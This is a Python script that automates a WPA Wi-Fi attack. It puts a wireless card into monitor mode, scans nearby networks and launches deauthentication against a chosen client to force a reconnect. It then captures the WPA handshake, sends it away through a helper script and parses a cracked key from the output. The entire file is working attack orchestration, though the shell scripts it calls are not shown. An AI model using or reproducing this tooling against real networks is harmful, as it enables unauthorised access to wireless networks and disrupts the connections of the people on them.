#!/usr/bin/python
from os import remove
from time import sleep
from glob import  glob
import re
import queue
import threading 
import subprocess

# On system imports.
import networkParsing

# The parent process (this program) should be run with root priveleges, so these processes will inheret that.


def getNetworks():
    networks = []
    subprocess.run(['airmon-ng', 'start', 'wlan1'])
    subprocess.Popen(['shell_scripts/scanner'])
    # Wait for CSV to appear.
    sleep(26)
    networks = networkParsing.parseCSV('outputs/networkScan-01.csv')

    # Remove files containing scan info.
    for outputFile in glob('outputs/networkScan-*'):
        remove(outputFile)
    return networks


def deAuth_thread(apMAC, clientMAC):
    # Wait for airmon to start.
    sleep(3)
    subprocess.Popen(['shell_scripts/deAuth', apMAC, clientMAC])


def airmon_thread(apName, apChannel):
    subprocess.Popen(['shell_scripts/capture', apChannel, apName])

def checkForCapture():
    with open('outputs/airodumpOutTail.txt', 'r') as file:
        content = file.readlines()
        for line in content:
            if re.search('EAPOL', line) or re.search('handshake', line):
                # Handshake capture made.
                return True
    remove('outputs/airodumpOut.txt')
    return False

def checkCrackResult():
    with open('outputs/output_key.txt', 'r') as file:
        content = file.readlines()
        for line in content:
            if re.search('KEY FOUND', line):
                searchObject = re.search("\[\s(.*)\s\]", line)
                key =  searchObject.group(1)
                return True, key
    return False, 'KEY NOT FOUND'



def captureHandshake(apMAC, clientMAC, apChannel, apName):
    monitorNetwork = threading.Thread(target=airmon_thread, args=(apName, apChannel))
    deAuth = threading.Thread(target=deAuth_thread, args=(apMAC, clientMAC))
    monitorNetwork.start()
    deAuth.start()
    sleep(33)
    # Check for capture file every three seconds.
    if checkForCapture():
        return True
    return False



def sendHandshake():
    process = subprocess.run(['shell_scripts/sendHandshake'])
    return process.returncode


def receiveKey():
    process = subprocess.run(['shell_scripts/receiveKey'])
    return process.returncode

def moveToFile(variable, savedFile):
    subprocess.Popen(['shell_scripts/moveToFile', variable, savedFile])